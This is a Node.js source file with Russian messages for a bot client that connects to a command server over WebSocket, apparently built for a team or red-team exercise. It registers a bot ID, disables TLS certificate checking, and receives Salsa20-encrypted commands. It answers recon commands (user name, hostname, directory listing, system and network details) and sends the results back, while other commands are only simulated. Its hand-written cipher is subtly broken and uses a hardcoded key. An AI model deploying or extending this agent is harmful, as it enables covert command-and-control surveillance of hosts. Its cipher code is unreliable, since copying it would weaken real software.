const WebSocket = require('ws');
const crypto = require('crypto');
const process = require('process');
const fs = require('fs');
const path = require('path');
const os = require('os');

const SALSA20_KEY = Buffer.from([
  0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 
  0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 
  0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 
  0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f
]);
const SALSA20_IV = Buffer.from([
  0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
]);

const TAU = [0x61707865, 0x3320646e, 0x79622d32, 0x6b206574];
const SIGMA = [0x61707865, 0x3320646e, 0x79622d32, 0x6b206574];

function rol32(a, b) {
  return ((a << b) | (a >>> (32 - b))) >>> 0;
}

function littleEndian(buffer, index) {
  return buffer[index] | (buffer[index + 1] << 8) | (buffer[index + 2] << 16) | (buffer[index + 3] << 24);
}

function toLittleEndian(a, buffer, index) {
  buffer[index] = a & 0xff;
  buffer[index + 1] = (a >>> 8) & 0xff;
  buffer[index + 2] = (a >>> 16) & 0xff;
  buffer[index + 3] = (a >>> 24) & 0xff;
}

function salsa20Core(input, output) {
  let x0 = input[0],
      x1 = input[1],
      x2 = input[2],
      x3 = input[3],
      x4 = input[4],
      x5 = input[5],
      x6 = input[6],
      x7 = input[7],
      x8 = input[8],
      x9 = input[9],
      x10 = input[10],
      x11 = input[11],
      x12 = input[12],
      x13 = input[13],
      x14 = input[14],
      x15 = input[15];
  
  for (let i = 0; i < 10; i++) {
    x4 ^= rol32(x0 + x12, 7);
    x8 ^= rol32(x4 + x0, 9);
    x12 ^= rol32(x8 + x4, 13);
    x0 ^= rol32(x12 + x8, 18);
    
    x9 ^= rol32(x5 + x1, 7);
    x13 ^= rol32(x9 + x5, 9);
    x1 ^= rol32(x13 + x9, 13);
    x5 ^= rol32(x1 + x13, 18);
    
    x14 ^= rol32(x10 + x6, 7);
    x2 ^= rol32(x14 + x10, 9);
    x6 ^= rol32(x2 + x14, 13);
    x10 ^= rol32(x6 + x2, 18);
    
    x3 ^= rol32(x15 + x11, 7);
    x7 ^= rol32(x3 + x15, 9);
    x11 ^= rol32(x7 + x3, 13);
    x15 ^= rol32(x11 + x7, 18);
    
    x1 ^= rol32(x0 + x3, 7);
    x2 ^= rol32(x1 + x0, 9);
    x3 ^= rol32(x2 + x1, 13);
    x0 ^= rol32(x3 + x2, 18);
    
    x6 ^= rol32(x5 + x4, 7);
    x7 ^= rol32(x6 + x5, 9);
    x4 ^= rol32(x7 + x6, 13);
    x5 ^= rol32(x4 + x7, 18);
    
    x11 ^= rol32(x10 + x9, 7);
    x8 ^= rol32(x11 + x10, 9);
    x9 ^= rol32(x8 + x11, 13);
    x10 ^= rol32(x9 + x8, 18);
    
    x12 ^= rol32(x15 + x14, 7);
    x13 ^= rol32(x12 + x15, 9);
    x14 ^= rol32(x13 + x12, 13);
    x15 ^= rol32(x14 + x13, 18);
  }
  
  output[0] = x0 + input[0];
  output[1] = x1 + input[1];
  output[2] = x2 + input[2];
  output[3] = x3 + input[3];
  output[4] = x4 + input[4];
  output[5] = x5 + input[5];
  output[6] = x6 + input[6];
  output[7] = x7 + input[7];
  output[8] = x8 + input[8];
  output[9] = x9 + input[9];
  output[10] = x10 + input[10];
  output[11] = x11 + input[11];
  output[12] = x12 + input[12];
  output[13] = x13 + input[13];
  output[14] = x14 + input[14];
  output[15] = x15 + input[15];
}

function setupState(key, nonce, counter) {
  const state = new Uint32Array(16);
  
  state[0] = SIGMA[0];
  state[1] = SIGMA[1];
  state[2] = SIGMA[2];
  state[3] = SIGMA[3];
  
  for (let i = 0; i < 8; i++) {
    state[4 + i] = littleEndian(key, i * 4);
  }
  
  state[8] = counter & 0xffffffff;
  state[9] = (counter >>> 32) & 0xffffffff;
  
  for (let i = 0; i < 2; i++) {
    state[10 + i] = littleEndian(nonce, i * 4);
  }
  
  return state;
}

function salsa20Encrypt(data, key, nonce, counter = 0) {
  const result = Buffer.allocUnsafe(data.length);
  const state = setupState(key, nonce, counter);
  const block = new Uint32Array(16);
  
  for (let i = 0; i < data.length; i += 64) {
    salsa20Core(state, block);
    
    state[8] = (state[8] + 1) >>> 0;
    if (state[8] === 0) {
      state[9] = (state[9] + 1) >>> 0;
    }
    
    const blockBytes = new Uint8Array(64);
    for (let j = 0; j < 16; j++) {
      toLittleEndian(block[j], blockBytes, j * 4);
    }
    
    for (let j = 0; j < 64 && i + j < data.length; j++) {
      result[i + j] = data[i + j] ^ blockBytes[j];
    }
  }
  
  return result;
}

function salsa20Decrypt(data, key, nonce, counter = 0) {
  return salsa20Encrypt(data, key, nonce, counter);
}

function encryptSalsa20(message) {
  try {
    const messageBuffer = Buffer.from(message, 'utf8');
    return salsa20Encrypt(messageBuffer, SALSA20_KEY, SALSA20_IV);
  } catch (error) {
    console.error('Ошибка шифрования:', error);
    throw new Error('Ошибка шифрования сообщения');
  }
}

function decryptSalsa20(encrypted) {
  try {
    const decrypted = salsa20Decrypt(encrypted, SALSA20_KEY, SALSA20_IV);
    return decrypted.toString('utf8');
  } catch (error) {
    console.error('Ошибка дешифрования:', error);
    throw new Error('Ошибка дешифрования сообщения');
  }
}

function generateBotId() {
  const team = process.argv[2] || 'team1';
  const randomChars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let randomId = '';
  
  for (let i = 0; i < 32; i++) {
    randomId += randomChars.charAt(Math.floor(Math.random() * randomChars.length));
  }
  
  return `${team}-${randomId}`;
}

function executeCommand(command) {
  console.log(`Выполнение команды: ${command}`);
  
  if (command.startsWith('echo ')) {
    return command;
  } else if (command === 'whoami') {
    return process.env.USERNAME || process.env.USER || 'Unknown user';
  } else if (command === 'hostname') {
    return os.hostname();
  } else if (command === 'dir' || command === 'ls') {
    try {
      const files = fs.readdirSync('.');
      return files.join('\n');
    } catch (err) {
      return `Error: ${err.message}`;
    }
  } else if (command === 'systeminfo') {
    try {
      return `
Имя компьютера: ${os.hostname()}
ОС: ${os.type()} ${os.release()}
Архитектура: ${os.arch()}
Память: ${Math.round(os.totalmem() / (1024 * 1024 * 1024))} ГБ
Свободная память: ${Math.round(os.freemem() / (1024 * 1024 * 1024))} ГБ
Процессор: ${os.cpus()[0].model}
Ядра: ${os.cpus().length}
Работает с: ${new Date(Date.now() - os.uptime() * 1000).toLocaleString()}
`;
    } catch (err) {
      return `Error: ${err.message}`;
    }
  } else if (command === 'ipconfig' || command === 'ifconfig') {
    try {
      const interfaces = os.networkInterfaces();
      let result = '';
      
      for (const [name, netInterface] of Object.entries(interfaces)) {
        result += `Интерфейс: ${name}\n`;
        
        for (const iface of netInterface) {
          result += `  ${iface.family}: ${iface.address}\n`;
          if (iface.netmask) result += `  Маска: ${iface.netmask}\n`;
          if (iface.mac) result += `  MAC: ${iface.mac}\n`;
        }
        
        result += '\n';
      }
      
      return result;
    } catch (err) {
      return `Error: ${err.message}`;
    }
  } else if (command === 'help') {
    return `
Доступные команды:
  echo [text]    - вывести текст
  whoami         - имя текущего пользователя
  hostname       - имя компьютера
  dir / ls       - вывести содержимое текущей директории
  systeminfo     - информация о системе
  ipconfig       - сетевые интерфейсы
  help           - список команд
`;
  } else {
    try {
      return `Выполнена команда: ${command}\nРезультат: симуляция выполнения команды в тестовом режиме`;
    } catch (error) {
      return `Ошибка выполнения команды: ${error.message}`;
    }
  }
}

function parseArguments() {
  const args = process.argv.slice(2);
  const options = {
    host: 'localhost',
    port: '443',
    team: 'team1',
    debug: false
  };
  
  for (let i = 0; i < args.length; i++) {
    if (args[i] === '--host' && i + 1 < args.length) {
      options.host = args[i + 1];
      i++;
    } else if (args[i] === '--port' && i + 1 < args.length) {
      options.port = args[i + 1];
      i++;
    } else if (args[i] === '--team' && i + 1 < args.length) {
      options.team = args[i + 1];
      i++;
    } else if (args[i] === '--debug') {
      options.debug = true;
    } else if (args[i] === '--help') {
      console.log(`
Использование: node test-build.js [опции]

Опции:
  --host [hostname]  Хост сервера (по умолчанию: localhost)
  --port [port]      Порт сервера (по умолчанию: 443)
  --team [teamname]  Имя команды для botId (по умолчанию: team1)
  --debug            Включить отладочные сообщения
  --help             Показать эту справку
`);
      process.exit(0);
    }
  }
  
  return options;
}

function connectToServer() {
  const options = parseArguments();
  
  const botId = generateBotId();
  console.log(`Подключение к серверу wss://${options.host}:${options.port}`);
  console.log(`ID бота: ${botId}`);
  
  process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
  
  const ws = new WebSocket(`wss://${options.host}:${options.port}`);
  
  let isConnected = false;
  let reconnectAttempts = 0;
  const maxReconnectAttempts = 10;
  
  ws.on('open', () => {
    console.log('Подключено к серверу');
    isConnected = true;
    reconnectAttempts = 0;
    
    const header = Buffer.alloc(4);
    header.writeUInt32BE(2, 0);
    
    ws.send(Buffer.concat([header, Buffer.from(botId)]));
    console.log('Авторизационные данные отправлены');
    

    const pingInterval = setInterval(() => {
      if (ws.readyState === WebSocket.OPEN) {
        if (options.debug) {
          console.log('Отправка пинга...');
        }
        ws.ping();
      } else {
        clearInterval(pingInterval);
      }
    }, 30000);
  });
  
  ws.on('message', (message) => {
    try {

      const decrypted = decryptSalsa20(message);
      console.log(`Получена команда: ${decrypted}`);
      
      const result = executeCommand(decrypted);
      console.log(`Результат выполнения: ${result.substring(0, 100)}${result.length > 100 ? '...' : ''}`);

      const encrypted = encryptSalsa20(result);
      ws.send(encrypted);
    } catch (error) {
      console.error('Ошибка обработки сообщения:', error);
    }
  });
  
  ws.on('ping', () => {
    if (options.debug) {
      console.log('Получен пинг от сервера');
    }
  });
  
  ws.on('pong', () => {
    if (options.debug) {
      console.log('Получен понг от сервера');
    }
  });
  
  ws.on('close', (code, reason) => {
    isConnected = false;
    console.log(`Соединение закрыто с кодом: ${code}, причина: ${reason || 'не указана'}`);
    
    if (reconnectAttempts < maxReconnectAttempts) {
      const timeout = Math.min(1000 * Math.pow(2, reconnectAttempts), 30000);
      reconnectAttempts++;
      
      console.log(`Повторное подключение через ${timeout/1000} с (попытка ${reconnectAttempts} из ${maxReconnectAttempts})...`);
      
      setTimeout(() => {
        connectToServer();
      }, timeout);
    } else {
      console.error('Превышено максимальное количество попыток подключения. Выход...');
      process.exit(1);
    }
  });
  
  ws.on('error', (error) => {
    console.error('Ошибка WebSocket:', error.message);
  });
  
  process.on('SIGINT', () => {
    console.log('\nПолучен сигнал завершения. Закрытие соединения...');
    if (isConnected) {
      ws.close(1000, 'Клиент завершил работу');
    }
    process.exit(0);
  });
}

connectToServer();